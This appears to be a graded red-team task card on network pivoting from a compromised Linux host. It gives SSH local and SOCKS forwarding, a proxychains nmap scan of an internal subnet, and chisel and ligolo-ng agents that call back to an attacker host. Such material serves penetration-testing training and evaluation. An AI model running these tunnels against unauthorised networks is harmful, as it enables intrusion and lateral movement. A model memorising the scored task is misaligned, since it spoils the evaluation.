# FOX-NET-001: Network Pivot — SSH Tunnel

## Info
| Field | Value |
|-------|-------|
| **ID** | FOX-NET-001 |
| **Domain** | Network / Infra |
| **MITRE** | T1090.003 (Proxy: Multi-hop Proxy) |
| **Difficulty** | Medium |
| **Prerequisites** | Foothold on a Linux host within target network |

## Methodology
1. **Check connectivity**: `ip addr`, `ip route`, `ss -tln`
2. **SSH tunnel (local forwarding)** — access internal service:
   ```bash
   ssh -L 127.0.0.1:3306:<internal-db-ip>:3306 user@foothold
   # Now connect to localhost:3306 → it's the internal DB
   ```
3. **SSH tunnel (dynamic/SOCKS)** — full internal access:
   ```bash
   ssh -D 9050 user@foothold
   # Configure proxychains: add "socks4 127.0.0.1 9050"
   # proxychains nmap -sT 10.0.0.0/24
   ```
4. **Chisel** — for restrictive environments (no SSH):
   ```bash
   # Server (attacker machine):
   chisel server -p 8000 --reverse
   
   # Client (foothold):
   chisel client <attacker-ip>:8000 R:3306:<internal-db>:3306
   ```
5. **Ligolo-ng** — full layer 2 tunnel:
   ```bash
   # Proxy (attacker):
   ligolo-proxy -selfcert
   
   # Agent (foothold):
   ligolo-agent -connect <attacker-ip>:11601 -ignorecert
   ```
6. **Verify**: Access internal resource through tunnel

## Keywords
`tunneling-and-pivoting`, `SSH tunnel`, `SOCKS proxy`, `chisel`, `ligolo-ng`, `proxychains`, `lateral movement`, `pivot`

## Scoring Criteria (0-100)
| Criteria | Points |
|----------|--------|
| Network discovery (routes, interfaces) | 15 |
| SSH tunnel established (local or dynamic) | 25 |
| Internal service accessed via tunnel | 25 |
| Chisel or ligolo established (fallback) | 20 |
| Proxy chain configured for tools | 15 |
| **Total** | **100** |
